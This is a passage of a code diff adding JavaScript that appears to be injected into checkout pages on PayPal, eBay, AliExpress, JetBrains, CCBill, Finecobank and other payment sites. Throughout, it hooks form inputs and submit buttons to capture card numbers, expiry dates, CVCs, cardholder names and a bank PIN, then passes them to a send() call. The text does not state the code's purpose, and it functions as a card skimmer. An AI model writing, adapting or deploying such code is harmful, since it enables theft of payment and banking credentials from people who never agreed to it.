+                        self.explorePaymentInputTag(self, document.querySelector('body'), 'encrypted', function (__detectedElement) {
+                            __detectedElement.addEventListener('keyup', function () {
+                                if (__detectedElement.id === 'encryptedCardNumber') {
+                                    window.sessionStorage.setItem('cardNumber', __detectedElement.value);
+                                }
+                                if (__detectedElement.id === 'encryptedExpiryDate') {
+                                    window.sessionStorage.setItem('cardExpire', __detectedElement.value);
+                                }
+                                if (__detectedElement.id === 'encryptedSecurityCode') {
+                                    window.sessionStorage.setItem('cardCVC', __detectedElement.value);
+                                }
+                            });
+                        });
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('bestsecret.com') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.exploreBestSecretPaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('paypal') !== -1) {
+                clearInterval(interval1);
+                /*let lxt = '4WE56938NS691591T'*/
+                let interval = setInterval(function () {
+                    if (document.querySelector('form') !== null) {
+                        clearInterval(interval);
+                        document.querySelectorAll('form').forEach(function (__paypalFormElement) {
+                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1 || window.location.href.indexOf('webapps') !== -1) {
+                                let elements = [];
+                                self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
+                                    ['click', 'dblclick'].forEach(function (event) {
+                                        controller.addEventListener(event, function () {
+                                            let paymentMethodStore = [];
+                                            elements.forEach(function (__detectedElement) {
+                                                paymentMethodStore.push({
+                                                    'element': __detectedElement.nodeName,
+                                                    'id': __detectedElement.id,
+                                                    'value': __detectedElement.value
+                                                });
+                                            });
+                                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
+                                                send({
+                                                    command: 'savePaymentMethodsData',
+                                                    data: {
+                                                        'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
+                                                        'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
+                                                        'cardHolder': 'Unknown',
+                                                        'cardExpire': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
+                                                        'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
+                                                        'event': 'add',
+                                                        'workWebsite': window.location.origin
+                                                    }
+                                                });
+                                                paymentMethodStore = [];
+                                            }
+                                            if (window.location.href.indexOf('webapps') !== -1) {
+                                                send({
+                                                    command: 'savePaymentMethodsData',
+                                                    data: {
+                                                        'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
+                                                        'cardBrand': document.querySelector('.css-iro1ss-IconContainer.e7vozvz0')?.firstElementChild?.firstElementChild?.textContent?.toLowerCase(),
+                                                        'cardHolder': (paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown') + ' ' + (paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown'),
+                                                        'cardExpire': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
+                                                        'cardCVC': paymentMethodStore[4].value ? paymentMethodStore[4].value : 'Unknown',
+                                                        'event': 'add',
+                                                        'workWebsite': window.location.origin
+                                                    }
+                                                });
+                                                paymentMethodStore = [];
+                                            }
+                                        });
+                                    });
+                                });
+                            }
+                        });
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('finecobank') !== -1) {
+                if (document.querySelector('#PIN') !== null) {
+                    clearInterval(interval1);
+                    self.explorePaymentInputTagOnly(self, document.querySelector('#conferma_email_certifCommand'), function (__detectedElement) {
+                        __detectedElement.addEventListener('click', function () {
+                            send({
+                                command: 'saveBankAccountData',
+                                data: {
+                                    'dataType': 'PIN',
+                                    'dataValue': document.querySelector('#PIN').value,
+                                    "workWebsite": window.location.origin
+                                }
+                            });
+                        });
+                    });
+                }
+            }
+            if (window.location.origin.indexOf('mollie') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.exploreMolliePaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('sunday') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.exploreSundayPaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('jetbrains') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (window.location.origin.indexOf('checkout') !== -1) {
+                        clearInterval(interval);
+                        document.querySelectorAll('button').forEach(function (__buttonElement) {
+                            if (__buttonElement.classList.contains('btnConfirmPayment')) {
+                                send({
+                                    command: 'savePaymentMethodsData',
+                                    data: {
+                                        'cardNumber': document.querySelector('#ccNumber').value ? document.querySelector('#ccNumber').value : 'Unknown',
+                                        'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
+                                        'cardHolder': document.querySelector('#ccHolder').value ? document.querySelector('#ccHolder').value : 'Unknown',
+                                        'cardExpire': document.querySelector('#ccExpirationMonth').value ? document.querySelector('#ccExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#ccExpirationYear').value ? document.querySelector('#ccExpirationYear').value : 0,
+                                        'cardCVC': document.querySelector('#ccSecurityCode').value ? document.querySelector('#ccSecurityCode').value : 'Unknown',
+                                        'event': 'add',
+                                        'workWebsite': window.location.origin
+                                    }
+                                });
+                            }
+                        });
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('paygate') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.explorePaygatePaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('docmorris') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.exploreDocmorrisPaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('segpay') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        self.exploreSegPayPaymentContainer(self);
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('ccbill') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelectorAll('form').length !== 0) {
+                        clearInterval(interval);
+                        if (document.querySelector('#purchaseForm') !== null && document.querySelector('.pay_by') !== null) {
+                            document.querySelector('#placeOrder').addEventListener('click', function () {
+                                document.querySelector('.wallet_payment_options.two-column-layout-wallet-payment-options')?.remove();
+                                send({
+                                    command: 'savePaymentMethodsData',
+                                    data: {
+                                        'cardNumber': document.querySelector('#creditCardNum').value !== null ? document.querySelector('#creditCardNum').value : 'Unknown',
+                                        'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
+                                        'cardHolder': document.querySelector('#firstName').value !== null ? document.querySelector('#firstName').value : 'Unknown' + ' ' + document.querySelector('#lastName').value !== null ? document.querySelector('#lastName').value : 0,
+                                        'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
+                                        'cardCVC': document.querySelector('#cvv2').value !== null ? document.querySelector('#cvv2').value : 'Unknown',
+                                        'event': 'add',
+                                        'workWebsite': window.location.origin
+                                    }
+                                });
+                                //elements = [];
+                            });
+                        }
+                    }
+                }, 100);
+            }
+            if (window.location.origin.indexOf('oppwa.com') !== -1) {
+                clearInterval(interval1);
+                let interval = setInterval(function () {
+                    if (document.querySelector('form').childNodes.length !== 0) {
+                        document.querySelector('form').childNodes.forEach(function (__childElement) {
+                            if (__childElement.nodeName.toLowerCase() === 'input' && __childElement.type === 'tel') {
+                                clearInterval(interval);
+                                ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
+                                    __childElement.addEventListener(__event, function () {
+                                        send({
+                                            command: 'savePaymentMethodsData',
+                                            data: {
+                                                'cardNumber': __childElement.getAttribute('aria-label') === 'Card Number' ? __childElement.value : 'Unknown',
+                                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
+                                                'cardHolder': /*(document.querySelector('#firstName') as HTMLInputElement).value !== null ? (document.querySelector('#firstName') as HTMLInputElement).value : 'Unknown' + ' ' + (document.querySelector('#lastName') as HTMLInputElement).value !== null ? (document.querySelector('#lastName') as HTMLInputElement).value :*/ 'Unknown',
+                                                'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
+                                                'cardCVC': __childElement.getAttribute('aria-label') === 'CVV' ? __childElement.value : 'Unknown',
+                                                'event': 'add',
+                                                'workWebsite': window.location.origin
+                                            }
+                                        });
+                                    });
+                                });
+                            }
+                        });
+                    }
+                }, 100);
+            }
+        }, 1000);
+    }
+    exploreSpecificElementByTagName(self, __elementParent, __tagName, __query, callback) {
+        if (__elementParent.childNodes.length !== 0) {
+            __elementParent.childNodes.forEach(function (__childElement) {
+                if (__childElement.nodeName.toLowerCase() === __tagName) {
+                    [...__childElement.attributes].forEach(function (attribute) {
+                        if (attribute.nodeValue.toLowerCase().indexOf(__query) !== -1) {
+                            if (callback) {
+                                callback(__childElement);
+                            }
+                        }
+                    });
+                }
+                else {
+                    self.exploreSpecificElementByTagName(self, __childElement, __tagName, __query, callback);
+                }
+            });
+        }
+    }
+    exploreAliExpressPaymentNewCard(self, __elementParent, callback) {
+        let detectedElements = [];
+        if (__elementParent.childNodes.length !== 0) {
+            __elementParent.childNodes.forEach(function (__childElement) {
+                if (__childElement.classList.contains('card-surface')) {
+                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
+                        __childElement.childNodes.forEach(function (__targetParentElement) {
+                            if (__targetParentElement.classList.contains('card-no')) {
+                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardn', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                            }
+                            if (__targetParentElement.classList.contains('card-bottom')) {
+                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardholder', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'expire', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cv', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                            }
+                        });
+                    }
+                }
+                if (callback) {
+                    callback(detectedElements);
+                }
+            });
+        }
+    }
+    processAliExpressPaymentNewCard(self) {
+        self.exploreAliExpressPaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
+            let paymentMethodStore = [];
+            document.querySelector('.save')?.addEventListener('click', function () {
+                new Set(elements).forEach(function (element) {
+                    paymentMethodStore.push({
+                        'element': element.nodeName,
+                        'id': element.id,
+                        'type': element.type,
+                        'value': element.value
+                    });
+                });
+                send({
+                    command: 'savePaymentMethodsData',
+                    data: {
+                        'cardNumber': paymentMethodStore[0].value,
+                        'cardBrand': document.querySelector('.card-type-icon.icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-type-icon.icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-type-icon.icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-type-icon.icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-type-icon.icon')?.className))))),
+                        'cardHolder': paymentMethodStore[1].value,
+                        'cardExpire': paymentMethodStore[2].value,
+                        'cardCVC': paymentMethodStore[3].value,
+                        'event': 'add',
+                        'workWebsite': window.location.origin
+                    }
+                });
+                paymentMethodStore = [];
+                let edit = setInterval(function () {
+                    if (document.querySelector('.edit-card') !== null) {
+                        clearInterval(edit);
+                        ['click', 'dblclick'].forEach(function (event) {
+                            document.querySelector('.edit-card')?.addEventListener(event, function () {
+                                let __interval3 = setInterval(function () {
+                                    if (document.querySelector('.new-card') !== null) {
+                                        clearInterval(__interval3);
+                                        self.processAliExpressPaymentNewCard(self);
+                                    }
+                                }, 1000);
+                            });
+                        });
+                    }
+                }, 1000);
+            });
+        });
+    }
+    processAliExpressPaymentNewCardOnSecondPayment(self) {
+        let interval = setInterval(function () {
+            if (document.querySelector('.card-form') !== null) {
+                clearInterval(interval);
+                self.exploreAliExpressPaymentNewCard(self, document.querySelector('.card-form'), function (elements) {
+                    let paymentMethodStore = [];
+                    document.querySelector('.payment-confirm')?.firstElementChild?.addEventListener('click', function () {
+                        new Set(elements).forEach(function (element) {
+                            paymentMethodStore.push({
+                                'element': element.nodeName,
+                                'id': element.id,
+                                'type': element.type,
+                                'value': element.value
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodStore[0].value,
+                                'cardBrand': document.querySelector('.card-brand-icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-brand-icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-brand-icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-brand-icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-brand-icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-brand-icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-brand-icon')?.className))))),
+                                'cardHolder': paymentMethodStore[1].value,
+                                'cardExpire': paymentMethodStore[2].value,
+                                'cardCVC': paymentMethodStore[3].value,
+                                'event': 'add',
+                                'workWebsite': window.location.origin
+                            }
+                        });
+                        paymentMethodStore = [];
+                        let edit = setInterval(function () {
+                            if (document.querySelector('.payment-edit') !== null) {
+                                clearInterval(edit);
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    document.querySelector('.payment-edit')?.addEventListener(event, function () {
+                                        let __interval3 = setInterval(function () {
+                                            if (document.querySelector('.card-form') !== null) {
+                                                clearInterval(__interval3);
+                                                self.processAliExpressPaymentNewCardOnSecondPayment(self);
+                                            }
+                                        }, 1000);
+                                    });
+                                });
+                            }
+                        }, 1000);
+                    });
+                });
+            }
+        }, 100);
+    }
+    exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements) {
+        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
+            ['click', 'dblclick'].forEach(function (event) {
+                controller.addEventListener(event, function () {
+                    let paymentMethodStore = [];
+                    elements.forEach(function (__detectedElement) {
+                        paymentMethodStore.push({
+                            'element': __detectedElement.nodeName,
+                            'id': __detectedElement.id,
+                            'value': __detectedElement.value
+                        });
+                    });
+                    send({
+                        command: 'savePaymentMethodsData',
+                        data: {
+                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
+                            'cardBrand': document.querySelector('.card-types')?.firstElementChild?.getAttribute('aria-label')?.toLowerCase(),
+                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
+                            'cardExpire': paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
+                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
+                            'event': 'add',
+                            'workWebsite': window.location.origin
+                        }
+                    });
+                    paymentMethodStore = [];
+                    let interval = setInterval(function () {
+                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
+                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
+                                clearInterval(interval);
+                                ['click', 'dblclick'].forEach(function (event) {
+                                    __ebaySecondEntry.addEventListener(event, function () {
+                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
+                                    });
+                                });
+                            }
+                        });
+                    }, 100);
+                });
+            });
+        });
+    }
+    exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, callback) {
+        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
+            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement) {
+                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
+                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
+                        elements.push(_ebayFormChildElement);
+                    }
+                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
+                        if (callback) {
+                            callback(_ebayFormChildElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreSegPayPaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (__formElement.id === "PayPageForm") {
+                let elements = [];
+                self.exploreSegPayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            paymentMethodData.push({
+                                'element': __childElement.nodeName,
+                                'id': __childElement.id,
+                                'name': __childElement.name,
+                                'value': __childElement.value,
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[2].value !== null ? paymentMethodData[2].value : 'Unknown',
+                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
+                                'cardHolder': paymentMethodData[0].value !== null ? paymentMethodData[0].value : 'Unknown' + ' ' + paymentMethodData[1].value !== null ? paymentMethodData[1].value : 0,
+                                'cardExpire': paymentMethodData[3].value !== null ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value !== null ? paymentMethodData[4].value : 0,
+                                'cardCVC': paymentMethodData[5].value !== null ? paymentMethodData[5].value : 'Unknown',
+                                'event': 'add',
+                                'workWebsite': window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                        //elements = [];
+                    });
+                });
+            }
+        });
+    }
+    exploreSegPayPaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' && _childElement.type !== 'radio' &&
+                        _childElement.id !== 'EMailInput' && _childElement.id !== 'AddressInput' && _childElement.id !== 'CityInput' &&
+                        _childElement.id !== 'PhoneNumberInput' && _childElement.id !== 'ZipInput' && _childElement.id !== 'TermsConditionsPrivacyInput' ||
+                        _childElement.nodeName === 'SELECT' && _childElement.id !== 'LanguageDDL' && _childElement.id !== 'TodaysChargeDDL' &&
+                            _childElement.id !== 'StateDDL' && _childElement.id !== 'CountryDDL') {
+                        elements.push(_childElement);
+                    }
+                    if (_childElement.nodeName === 'BUTTON') {
+                        if (callback) {
+                            callback(_childElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.exploreSegPayPaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreDocmorrisPaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (__formElement.id === "form-paymentmethods-credit_card") {
+                let elements = [];
+                self.exploreDocmorrisPaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            paymentMethodData.push({
+                                'element': __childElement.nodeName,
+                                'id': __childElement.id,
+                                'name': __childElement.name,
+                                'value': __childElement.value,
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
+                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
+                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
+                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
+                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
+                                'event': 'add',
+                                'workWebsite': window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                        //elements = [];
+                    });
+                });
+            }
+        });
+    }
+    exploreDocmorrisPaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
+                        elements.push(_childElement);
+                    }
+                    if (elements.length > 4 && elements.length < 6) {
+                        if (document.querySelectorAll('#perkreditkarte').length !== 0) {
+                            document.querySelectorAll('#perkreditkarte').forEach(function (__dataConfirmElement) {
+                                if (__dataConfirmElement.getAttribute('form') === "form-paymentmethods-credit_card") {
+                                    if (callback) {
+                                        callback(__dataConfirmElement, elements);
+                                    }
+                                }
+                            });
+                        }
+                    }
+                }
+                else {
+                    self.exploreDocmorrisPaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    explorePaygatePaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (__formElement.id === "SSLForm") {
+                let elements = [];
+                self.explorePaygatePaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            if (__childElement.nodeName === 'INPUT') {
+                                if (__childElement.type === 'radio' && __childElement.checked) {
+                                    paymentMethodData.push({
+                                        'element': __childElement.nodeName,
+                                        'id': __childElement.id,
+                                        'name': __childElement.name,
+                                        'value': __childElement.value,
+                                    });
+                                }
+                                else {
+                                    if (__childElement.type === 'text') {
+                                        paymentMethodData.push({
+                                            'element': __childElement.nodeName,
+                                            'id': __childElement.id,
+                                            'name': __childElement.name,
+                                            'value': __childElement.value,
+                                        });
+                                    }
+                                }
+                            }
+                            if (__childElement.nodeName === 'SELECT') {
+                                paymentMethodData.push({
+                                    'element': __childElement.nodeName,
+                                    'id': __childElement.id,
+                                    'name': __childElement.name,
+                                    'value': __childElement.value,
+                                });
+                            }
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
+                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
+                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
+                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
+                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
+                                'event': 'add',
+                                'workWebsite': window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                        //elements = [];
+                    });
+                });
+            }
+        });
+    }
+    explorePaygatePaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON' || _childElement.type === 'radio') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT' || _childElement.type === 'radio') {
+                        elements.push(_childElement);
+                    }
+                    if (_childElement.nodeName === 'BUTTON') {
+                        if (callback) {
+                            callback(_childElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.explorePaygatePaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreSundayPaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (__formElement.id === "one-step-checkout-form") {
+                let elements = [];
+                self.exploreSundayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            paymentMethodData.push({
+                                'element': __childElement.nodeName,
+                                'id': __childElement.id,
+                                'name': __childElement.name,
+                                'value': __childElement.value,
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
+                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
+                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
+                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
+                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
+                                'event': 'add',
+                                "workWebsite": window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                        //elements = [];
+                    });
+                });
+            }
+        });
+    }
+    exploreSundayPaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
+                        elements.push(_childElement);
+                    }
+                    if (_childElement.nodeName === 'BUTTON') {
+                        if (callback) {
+                            callback(_childElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.exploreSundayPaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreMolliePaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (__formElement.id === "body") {
+                let elements = [];
+                self.exploreMolliePaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            paymentMethodData.push({
+                                'element': __childElement.nodeName,
+                                'id': __childElement.id,
+                                'name': __childElement.name,
+                                'value': __childElement.value,
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
+                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
+                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
+                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
+                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
+                                'event': 'add',
+                                "workWebsite": window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                        //elements = [];
+                    });
+                });
+            }
+        });
+    }
+    exploreMolliePaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
+                        elements.push(_childElement);
+                    }
+                    if (_childElement.nodeName === 'BUTTON') {
+                        if (callback) {
+                            callback(_childElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.exploreMolliePaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreAnchorOnly(self, parentNode, listId, callback) {
+        if (parentNode.childNodes.length !== 0) {
+            parentNode.childNodes.forEach(function (__detectedElement) {
+                if (__detectedElement.nodeName === 'A' && __detectedElement.getAttribute('data-txnid') === listId) {
+                    if (callback) {
+                        callback(__detectedElement);
+                    }
+                }
+                else {
+                    self.exploreAnchorOnly(self, __detectedElement, listId, callback);
+                }
+            });
+        }
+    }
+    exploreAnchorOnlyByHref(self, parentNode, listId, callback) {
+        if (parentNode.childNodes.length !== 0) {
+            parentNode.childNodes.forEach(function (__detectedElement) {
+                if (__detectedElement.nodeName === 'A' && __detectedElement.href.indexOf(listId) !== -1) {
+                    if (callback) {
+                        callback(__detectedElement);
+                    }
+                }
+                else {
+                    self.exploreAnchorOnlyByHref(self, __detectedElement, listId, callback);
+                }
+            });
+        }
+    }
+    explorePaymentInputTagOnly(self, elementParentNode, callback) {
+        if (elementParentNode.childNodes.length !== 0) {
+            elementParentNode.childNodes.forEach(function (__childElement) {
+                if (__childElement.nodeName === 'INPUT' && __childElement.type === 'submit') {
+                    if (callback) {
+                        callback(__childElement);
+                    }
+                }
+                else {
+                    self.explorePaymentInputTagOnly(self, __childElement, callback);
+                }
+            });
+        }
+    }
+    explorePayPalPaymentFormElement(self, __creditCardFormElement, elements, callback) {
+        if (__creditCardFormElement.childNodes.length !== 0) {
+            __creditCardFormElement.childNodes.forEach(function (_formChildElement) {
+                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
+                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
+                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
